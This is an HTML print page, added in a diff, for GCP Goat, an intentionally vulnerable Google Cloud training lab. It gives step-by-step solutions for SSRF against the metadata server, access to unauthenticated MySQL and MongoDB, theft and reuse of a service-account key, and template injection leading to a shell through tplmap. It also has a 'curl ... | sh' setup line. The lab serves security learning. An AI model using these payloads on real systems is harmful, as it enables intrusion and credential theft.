@@ -1,0 +1,542 @@
+<!DOCTYPE HTML>
+<html lang="en" class="sidebar-visible no-js light">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>GCP Goat</title>
+        
+        <meta name="robots" content="noindex" />
+        
+        
+
+
+        <!-- Custom HTML head -->
+        
+
+
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="GCP-Goat is intentionally vulnerable GCP environment to learn and practice GCP Security">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        
+        <link rel="icon" href="favicon.svg">
+        
+        
+        <link rel="shortcut icon" href="favicon.png">
+        
+        <link rel="stylesheet" href="css/variables.css">
+        <link rel="stylesheet" href="css/general.css">
+        <link rel="stylesheet" href="css/chrome.css">
+        
+        <link rel="stylesheet" href="css/print.css" media="print">
+        
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="FontAwesome/css/font-awesome.css">
+        
+        <link rel="stylesheet" href="fonts/fonts.css">
+        
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="highlight.css">
+        <link rel="stylesheet" href="tomorrow-night.css">
+        <link rel="stylesheet" href="ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        
+
+        
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item expanded "><a href="index.html"><strong aria-hidden="true">1.</strong> Introduction</a></li><li class="chapter-item expanded "><a href="about.html"><strong aria-hidden="true">2.</strong> About GCP Goat</a></li><li class="chapter-item expanded "><a href="Getting-Started.html"><strong aria-hidden="true">3.</strong> Getting Started</a></li><li class="chapter-item expanded "><a href="attacking-compute.html"><strong aria-hidden="true">4.</strong> Attacking Compute Engine</a></li><li class="chapter-item expanded "><a href="attacking-sql.html"><strong aria-hidden="true">5.</strong> Attacking Sql Instance</a></li><li class="chapter-item expanded "><a href="attacking-gke.html"><strong aria-hidden="true">6.</strong> Attacking GKE</a></li><li class="chapter-item expanded "><a href="attacking-gcs.html"><strong aria-hidden="true">7.</strong> Attacking GCS</a></li><li class="chapter-item expanded "><a href="privilege-escalation.html"><strong aria-hidden="true">8.</strong> Privilege Escalation</a></li><li class="chapter-item expanded "><a href="privilege-escalation-compute.html"><strong aria-hidden="true">9.</strong> Privilege Escalation in Compute Engine</a></li><li class="chapter-item expanded "><a href="wrap-up.html"><strong aria-hidden="true">10.</strong> Wrapping up</a></li><li class="chapter-item expanded "><a href="contributing.html"><strong aria-hidden="true">11.</strong> Contributing to the GCP Goat</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light (default)</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                        
+                    </div>
+
+                    <h1 class="menu-title">GCP Goat</h1>
+
+                    <div class="right-buttons">
+                        
+                        <a href="print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                        
+                        
+                    </div>
+                </div>
+
+                
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" name="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <img src="images/gcp-goat.png" alt="drawing" width="500"/>
+<h2 id="gcp-goat"><a class="header" href="#gcp-goat">GCP GOAT</a></h2>
+<p>GCP-Goat is intentionally vulnerable GCP environment to learn and practice GCP Security</p>
+<h2 id="-disclaimer"><a class="header" href="#-disclaimer">⚠️ Disclaimer</a></h2>
+<blockquote>
+<p>GCP Goat is the intentionally vulnerable GCP Setup .Don't Deploy this in production Environment </p>
+</blockquote>
+<blockquote>
+<p>GCP Goat comes with absolutely no warranties whatsoever. By using GCP Goat, you take full responsibility for any  outcomes that result.</p>
+</blockquote>
+<h2 id="about-the-author"><a class="header" href="#about-the-author">About the author</a></h2>
+<p>GCP goat was created by <a href="https://www.joshuajebaraj.com/">Joshua Jebaraj</a></p>
+<p><strong>Joshua Jebaraj</strong> is Security Enthusiast. He is an active member of many open-source communities like Null, Ansible and Hashicorp He frequently speaks at null Chennai chapter and OWASP Vit Chennai. He also Spoken at conferences like <strong>Owasp-Seasides</strong> and <strong>Bsides-Delhi</strong> . When away from the screen he can be found at watching movies and making memes</p>
+<h2 id="getting-started"><a class="header" href="#getting-started">Getting Started</a></h2>
+<p>This tutorial assumes that you have Google Cloud Account with Billing Enabled in order to create the resources need for the Setup</p>
+<p>If you have don't have the Google Cloud Account Create one by following the given link <a href="https://console.cloud.google.com/getting-started">Get Started with Google Cloud Platform</a></p>
+<p>Go to the <a href="https://console.cloud.google.com">Google-Console</a></p>
+<p>Create the new Project by Clicking Select Project</p>
+<p><img src="images/setup-1.png" alt="setup-1" /></p>
+<p>Create the new Project by Clicking New Project </p>
+<p><img src="images/setup-2.png" alt="setup-2" /></p>
+<p>Enter a Valid name and click Create</p>
+<p>Go to the <a href="https://console.cloud.google.com/apis">API Dashboard</a></p>
+<p>Click on the <code>ENABLE API AND SERVICES</code></p>
+<p><img src="images/setup-3.png" alt="setup-3" /></p>
+<p>Search for <code>Compute Engine API</code> and click Enable</p>
+<p><img src="images/setup-4.png" alt="setup-4" /></p>
+<p>Repeat the Same for the <code>Kubernetes Engine API</code> and for the <code>Cloud SQL Admin API</code></p>
+<p>Once you have done Go to the GCloud Shell by clicking the <code>terminal</code> icon in top right corner</p>
+<p><img src="images/setup-5.png" alt="setup-5" /></p>
+<p>Once you are inside the <code>Shell</code>  make sure the shell points to the current project </p>
+<p><img src="./images/2021-08-07-23-36-35.png" alt="" /></p>
+<p>clone the repository by  typing the following command in the <code>GCLOUD SHELL</code></p>
+<pre><code class="language-bash">git clone https://github.com/JOSHUAJEBARAJ/GCP-Goat.git
+</code></pre>
+<p>Move into the <code>Scenarios</code> folder by typing the following command in the <code>GCLOUD SHELL</code></p>
+<pre><code class="language-bash">cd GCP-Goat/scenarios/
+</code></pre>
+<h2 id="attacking-google-compute-engine"><a class="header" href="#attacking-google-compute-engine">Attacking Google Compute Engine</a></h2>
+<p>In order to start the scenario go to the <code>scenario-1</code> folder by typing the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">cd scenario-1
+</code></pre>
+<p>Start the Scenario by typing the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">./create-scenario-1.sh
+</code></pre>
+<blockquote>
+<p>Note: It takes some time in  to install and Start the  docker container so be patient 🧘‍♂️</p>
+</blockquote>
+<h2 id="scenario-info"><a class="header" href="#scenario-info">Scenario Info</a></h2>
+<p>SSRF is the most common Vulnerability found in the cloud Environment .</p>
+<p>According to <code>OWASP</code>
+<strong>In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources</strong></p>
+<p>In order to learn more about <code>SSRF</code> in Google Cloud I highly recommend to check out <a href="https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/">Tutorial on privilege escalation and post exploitation tactics in Google Cloud Platform environments</a>  by <a href="https://about.gitlab.com/company/team/#init_string">Chris Moberly</a></p>
+<p>In  our Scenario, we assume Our application was Suffering from <code>SSRF</code> vulnerability</p>
+<p>Go to the IP address shown in the output of the executed script</p>
+<p>On Visiting the URL using the browser The application should look like below Screenshot</p>
+<p><img src="images/2021-07-31-11-22-45.png" alt="Original" /></p>
+<h3 id="solution"><a class="header" href="#solution">Solution</a></h3>
+<p>Now enter the payload <code>http://metadata.google.internal/computeMetadata/v1/?recursive=true&amp;alt=text</code> in the URL field and <code>Metadata-Flavor: Google</code> in the header field and Click <code>CHECK STATUS</code> Button</p>
+<p><img src="images/2021-07-31-11-24-20.png" alt="" /></p>
+<p>Now you could able to see all the <code>meta-data</code> of the <code>Compute-Engine</code></p>
+<blockquote>
+<p>Note In recent version Compute Engine SSRF is only possible if you able to pass the <code>headers</code> as <code>Metadata-Flavor: Google</code> </p>
+</blockquote>
+<h3 id="clean-up"><a class="header" href="#clean-up">Clean up</a></h3>
+<p>To clean up the <code>Scenario</code> type the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">./delete-scenario-1.sh
+</code></pre>
+<p>Move into the previous folder by typing the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">cd ..
+</code></pre>
+<h2 id="attacking-sql-instance"><a class="header" href="#attacking-sql-instance">Attacking SQL Instance</a></h2>
+<p>In order to start the scenario go to the <code>scenario-2</code> folder by typing the below  command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">cd scenario-2
+</code></pre>
+<p>Start the Scenario by typing the below command in the <code>GCLOUD Shell</code> the script expects the user to give the name </p>
+<blockquote>
+<p>Note if you try to deploy the same scenario  create with the different name because reusing the same name will create conflicts</p>
+</blockquote>
+<pre><code class="language-bash">./create-scenario-2.sh &lt;SQL INSTANCE NAME&gt;
+</code></pre>
+<blockquote>
+<p>Note : It takes too long  to create the <code>instance</code> so be patient 🧘‍♂️</p>
+</blockquote>
+<h3 id="scenario-info-1"><a class="header" href="#scenario-info-1">Scenario info</a></h3>
+<p>Google SQL allows developers to set up the database without any hassle by default the database can be accessed only within the authorized network but during debugging the database sometimes the user may open the database to the public for easy debugging In this Scenario the attacker gets to know to about the public-facing SQL Instance</p>
+<h3 id="solution-1"><a class="header" href="#solution-1">Solution</a></h3>
+<p>Running <code>Nmap</code> Scan on the IP reveals that <code>MySQL</code> service  was running on the given instance</p>
+<p><img src="images/scenario-2a.png" alt="scenario-2a" /></p>
+<p>In order to get remote access to the instance <code>MySQL client</code> has to be Installed</p>
+<p>We can easily Install the <code>MYSQL-client</code> by following the <a href="https://dev.mysql.com/doc/refman/8.0/en/installing.html">offical docs</a></p>
+<p>Now type the below command in the terminal  to connect to the remote SQL instance running in the Google Cloud</p>
+<pre><code>mysql -u root -h &lt;ip&gt;
+</code></pre>
+<p><img src="images/scenario-2b.png" alt="scenario-2b" /></p>
+<blockquote>
+<p>Note This scenario assumes there was no authentication for the  database , but in real world may  find some weak credentials </p>
+</blockquote>
+<h3 id="clean-up-1"><a class="header" href="#clean-up-1">Clean up</a></h3>
+<p>To clean up the <code>Scenario</code> type the below  command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">./delete-scenario-2.sh &lt;SQL INSTANCE NAME&gt;
+</code></pre>
+<p>Move into the previous folder by typing the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">cd ..
+</code></pre>
+<h2 id="attacking-google-kubernetes-engine"><a class="header" href="#attacking-google-kubernetes-engine">Attacking Google Kubernetes Engine</a></h2>
+<p>Inorder to start the scenario go to the <code>scenario-3</code> folder by typing the below command in the <code>GCLOUD SHELL</code></p>
+<pre><code class="language-bash">cd scenario-3
+</code></pre>
+<p>Start the Scenario by typing the below command in the <code>GCLOUD SHELL</code></p>
+<pre><code class="language-bash">./create-scenario-3.sh
+</code></pre>
+<blockquote>
+<p>Note : It takes too long in order to setup the <code>kubernetes cluster</code> so be patient 🧘‍♂️</p>
+</blockquote>
+<h3 id="scenario-info-2"><a class="header" href="#scenario-info-2">Scenario info</a></h3>
+<p>GKE allows the user to set up the Kubernetes environment without much hassle ,By default the application running in the pod are not exposed outside world. To access the service outside the cluster there are 3 type of <code>services</code> can be use</p>
+<ol>
+<li>NodePort</li>
+<li>Loadbalancer</li>
+<li>Ingress</li>
+</ol>
+<p>Sometimes the application exposed via <code>Nodeport</code> may contains the sensitive information or services which meant to be used internally without authentication </p>
+<h3 id="solution-2"><a class="header" href="#solution-2">Solution</a></h3>
+<p>Type the below command  the in the <code>GCLOUD SHELL</code> to find the IP of nodes</p>
+<pre><code class="language-bash">kubectl get nodes -o wide
+</code></pre>
+<p>Now go to the browser and enter the below URL</p>
+<pre><code>&lt;NODE-IP&gt;:30003
+</code></pre>
+<p><img src="images/scenario-3a.png" alt="scenario-3a" /></p>
+<p>This reveals that the MongoDB service running on the node </p>
+<p>Now similar to <code>MySQL</code> we will try to connect to the <code>MongoDB</code> database remotely</p>
+<p>To connect from the mongo remotely we have to install MongoDB If you don't have <code>MongoDB</code> Installed you can easily Install by following <a href="https://docs.mongodb.com/manual/installation/">Official Docs</a> </p>
+<p>Now try to connect to the remote instance by typing the below command in the terminal</p>
+<pre><code class="language-bash">mongo --host &lt;ip&gt;:30003
+</code></pre>
+<p><img src="images/scenario-3b.png" alt="scenario-3b" /></p>
+<p>You could see we get the shell access to <code>mongo-db</code> instance</p>
+<p>If you are interested more on the <code>Kubernetes</code> I highly recommend to check out <a href="https://madhuakula.com/kubernetes-goat">Kubernetes-Goat</a></p>
+<h3 id="clean-up-2"><a class="header" href="#clean-up-2">Clean up</a></h3>
+<p>To clean up the <code>Scenario</code> type the below command in the <code>GCLOUD SHELL</code></p>
+<pre><code class="language-bash">./delete-scenario-3.sh 
+</code></pre>
+<p>Move into the previous folder by typing the below command in the <code>GCLOUD SHELL</code></p>
+<pre><code class="language-bash">cd ..
+</code></pre>
+<h2 id="attacking-google-cloud-storage"><a class="header" href="#attacking-google-cloud-storage">Attacking Google Cloud Storage</a></h2>
+<p>In order to start the scenario go to the <code>scenario-4</code> folder by typing the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">cd scenario-4
+</code></pre>
+<p>Start the Scenario by typing the below command in the <code>GCLOUD Shell</code> the script expects the user to give the Service name </p>
+<blockquote>
+<p>Note if you try to deploy the same scenario use different service account name, because reusing same the name will create conflicts and Also make sure to use the SERVICE ACCOUNT NAME with the length between 6 and 30</p>
+</blockquote>
+<pre><code class="language-bash">./create-scenario-4.sh &lt;SERVICE-ACCOUNT_NAME&gt;
+</code></pre>
+<h3 id="scenario-info-3"><a class="header" href="#scenario-info-3">Scenario info</a></h3>
+<p>Public-Facing Google Bucket is the most common vulnerability in the <code>GCP</code> environment Users often create the bucket with public access in order to use the data stored in the bucket to be used by external application ,Sometimes this leads leakage of sensitive information</p>
+<h3 id="solution-3"><a class="header" href="#solution-3">Solution</a></h3>
+<p>Go to the URL shown in the output the above script</p>
+<p><img src="images/scenario-4a.png" alt="scenario-4a" /></p>
+<p>Now open the URL in the browser On opening the URL it shows there was a file called <code>service-key.json</code></p>
+<p><img src="images/scenario-4b.png" alt="scenario-4b" /></p>
+<p>Download the file by typing the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">wget &lt;URL&gt;/service-key.json
+</code></pre>
+<p>Executing <code>cat</code> command on the <code>service-key.json</code> reveals that it was service account key </p>
+<p><img src="images/scenario-4c.png" alt="scenario-4c" /></p>
+<p>In the next Scenario we will see how to use the  obtained key</p>
+<h3 id="clean-up-3"><a class="header" href="#clean-up-3">Clean up</a></h3>
+<p>To clean up the <code>Scenario</code> type the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">./delete-scenario-4.sh 
+</code></pre>
+<p>Move into the previous folder by typing the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">cd ..
+</code></pre>
+<h2 id="privilege-escalation-using-service-account"><a class="header" href="#privilege-escalation-using-service-account">Privilege escalation Using Service account</a></h2>
+<blockquote>
+<p>Note This scenario was based on the previous scenario So before continuing this scenario please make sure that you have completed the previous one </p>
+</blockquote>
+<p>Inorder to start the scenario go to the <code>scenario-5</code> folder by typing the below command in the  <code>GCloud Shell</code></p>
+<pre><code class="language-bash">cd scenario-5
+</code></pre>
+<p>Start the Scenario by typing the below command in the  <code>GCloud Shell</code></p>
+<pre><code class="language-bash">./create-scenario-5.sh
+</code></pre>
+<h3 id="scenario-info-4"><a class="header" href="#scenario-info-4">Scenario Info</a></h3>
+<p>Google Container Registry Allows to store our container Registry Google Container Registry uses <code>Google Storage Bucket</code> to store the image So anyone with admin access to the bucket can download the image</p>
+<h3 id="scenario-solution"><a class="header" href="#scenario-solution">Scenario Solution</a></h3>
+<p>In order to get access to the bucket, we are going to use <code>Service-Account-Key</code> that we obtain in the previous scenario</p>
+<p>Before proceeding with the scenario copy the key from the scenario-4 directory to the current directory by typing the below command</p>
+<pre><code class="language-bash">cd ..
+cp scenario-4/service-key.json scenario-5/service-key.json
+cd scenario-5
+</code></pre>
+<p>Now activate the service account using the key by typing the below command in the  <code>GCloud Shell</code></p>
+<pre><code class="language-bash">gcloud auth activate-service-account --key-file=service-key.json
+
+</code></pre>
+<p>Now list the container stored in Google Container Registry by typing the below  command in the  <code>GCloud Shell</code></p>
+<pre><code class="language-bash">gcloud container images list
+</code></pre>
+<p><img src="images/scenario-5a.png" alt="scenario-5a" /></p>
+<p>Now download and run the container by typing the below command in the  <code>GCloud Shell</code></p>
+<pre><code class="language-bash">docker run  --rm  -ti  gcr.io/&lt;project-name&gt;/secret:v1 sh
+</code></pre>
+<blockquote>
+<p>make sure to add the tag in the Container Name The name should be in the format of gcr.io/<project-name>/secret:v1</p>
+</blockquote>
+<p>On listing down the file container using <code>ls</code> command there was a file called <code>secret</code></p>
+<p><img src="images/scenario-5b.png" alt="scenario-5a" /></p>
+<p>Now perform <code>cat</code> on the file  to see the content on the File</p>
+<p><img src="images/scenario-5c.png" alt="scenario-5c" /></p>
+<p>Get out of the container shell by typing <code>exit</code> in the shell</p>
+<h3 id="clean-up-4"><a class="header" href="#clean-up-4">Clean up</a></h3>
+<p>Before cleaning the scenario switch back to the original account by typing below command in the  <code>GCloud Shell</code></p>
+<pre><code class="language-bash"> gcloud config set account &lt;email&gt;
+
+</code></pre>
+<p>To clean up the <code>Scenario</code> type the below command in the  <code>GCloud Shell</code></p>
+<blockquote>
+<p>Note this name should be the same name that we used to create the scenario-4</p>
+</blockquote>
+<pre><code class="language-bash">./delete-scenario-5.sh &lt;SERVICE-ACCOUNT_NAME&gt;
+</code></pre>
+<h1 id="privilege-escalation-in-compute-engine"><a class="header" href="#privilege-escalation-in-compute-engine">Privilege Escalation in Compute Engine</a></h1>
+<p>Inorder to start the scenario go to the <code>scenario-6</code> folder by typing the below command in the <code>GCLOUD SHELL</code></p>
+<pre><code class="language-bash">cd scenario-6
+</code></pre>
+<p>Start the Scenario by typing the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">./create-scenario-6.sh
+</code></pre>
+<blockquote>
+<p>Note: It takes some time , so be patient 🧘‍♂️ Note down the ip</p>
+</blockquote>
+<p>Now Go to the <code>Compute Engine</code> -&gt; <code>VMInstance</code></p>
+<p><img src="./images/2021-07-25-14-49-09.png" alt="" /></p>
+<p>Now click on the <code>ssh</code> , the New browser window will be open <code>ssh-terminal</code></p>
+<p><img src="./images/2021-08-07-14-42-31.png" alt="" /></p>
+<p>Type the below command in the terminal </p>
+<pre><code class="language-bash">curl https://raw.githubusercontent.com/JOSHUAJEBARAJ/hack/main/setup.sh | sh 
+</code></pre>
+<blockquote>
+<p>Python Server will be started </p>
+</blockquote>
+<h2 id="scenario-info-5"><a class="header" href="#scenario-info-5">Scenario Info</a></h2>
+<p>According to Google <a href="https://cloud.google.com/iam/docs/service-accounts">Documentation</a> </p>
+<p><strong>A service account is a special kind of account used by an application or a virtual machine (VM) instance, not a person. Applications use service accounts to make authorized API calls, authorized as either the service account itself, or as Google Workspace or Cloud Identity users through domain-wide delegation.</strong></p>
+<p>The default service account created with the VM Instance doesn't follow the least privilege principle be default its able to access the Google cloud bucket</p>
+<p>Now Go to the below url</p>
+<pre><code>http://&lt;ip-address&gt;/page?name=Joshua
+</code></pre>
+<p><img src="./images/2021-07-25-19-49-25.png" alt="" /></p>
+<p>Now try to use the different paramater </p>
+<pre><code class="language-bash"></code></pre>
+<p><img src="./images/2021-08-07-14-47-10.png" alt="" />
+Check whether the application is vulnerable to the template Injection</p>
+<pre><code>http://&lt;ip&gt;/page?name={{7*7}}
+</code></pre>
+<p>You could see the application is vulnerable to <a href="https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server_Side_Template_Injection">template-Injection</a>.</p>
+<p><img src="./images/2021-08-07-14-48-23.png" alt="tql" /></p>
+<h3 id="solution-4"><a class="header" href="#solution-4">Solution</a></h3>
+<p>To exploit this vulnerability we are going to use the tool called <a href="https://github.com/epinna/tplmap">tplmap</a></p>
+<pre><code>./tplmap.py -u 'http://&lt;ip&gt;/page?name=John'
+</code></pre>
+<p>you will get the output like this </p>
+<p><img src="./images/2021-07-25-19-59-09.png" alt="" /></p>
+<p>Now try to get the shell in the application </p>
+<pre><code>./tplmap.py -u 'http://&lt;ip&gt;/page?name=jebaraj' --os-shell
+</code></pre>
+<p>Now inside the shell try to list the bucket </p>
+<pre><code>gsutil ls 
+</code></pre>
+<p><img src="./images/2021-08-07-14-53-53.png" alt="" />
+You will see the all buckets present in the project </p>
+<h3 id="clean-up-5"><a class="header" href="#clean-up-5">Clean up</a></h3>
+<p>To clean up the <code>Scenario</code> type the below command in the <code>GCLOUD Shell</code></p>
+<pre><code class="language-bash">./delete-scenario-6.sh
+</code></pre>
+<h1 id="wrapping-up"><a class="header" href="#wrapping-up">Wrapping up</a></h1>
+<p>Once you have done the all scenarios To avoid any extra charges and to make sure all resources are deleted , Delete the project </p>
+<pre><code class="language-bash">gcloud projects delete PROJECT_ID
+</code></pre>
+<h2 id="contributing-to-the-gcp-goat"><a class="header" href="#contributing-to-the-gcp-goat">Contributing to the GCP GOAT</a></h2>
+<p>Thanks for Showing Interest to Contribute to the <code>GCP-GOAT</code></p>
+<p>Here are the few ways you can contribute</p>
+<ul>
+<li>Improving the Documentation</li>
+<li>Adding More Scenarios to the GOAT</li>
+<li>Improving the Application used in the Scenarios</li>
+<li>Spreading the word with the community </li>
+</ul>
+<h3 id="in-order-to-contribute-to-the-gcp-goat-get-connected-to-the-author-via"><a class="header" href="#in-order-to-contribute-to-the-gcp-goat-get-connected-to-the-author-via">In order to contribute to the GCP-GOAT get connected to the author via</a></h3>
+<ul>
+<li><a href="https://twitter.com/joshva_jebaraj?lang=en">Twitter</a></li>
+<li><a href="https://www.linkedin.com/in/joshua-jebaraj-b6a543160/">LinkedIn</a></li>
+<li><a href="https://github.com/JOSHUAJEBARAJ">Github</a></li>
+</ul>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                        
+
+                        
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                
+
+                
+            </nav>
+
+        </div>
+
+        
+        <!-- Livereload script (if served using the cli tool) -->
+        <script type="text/javascript">
+            var socket = new WebSocket("ws://localhost:3000/__livereload");
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+        
+
+        
+
+        
+
+        
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        
+
+        
+
+        
+        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
+        
+
+        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+        
+
+        
+        
+        <script type="text/javascript">
+        window.addEventListener('load', function() {
+            window.setTimeout(window.print, 100);
+        });
+        </script>
+        
+        
+
+    </body>
+</html>
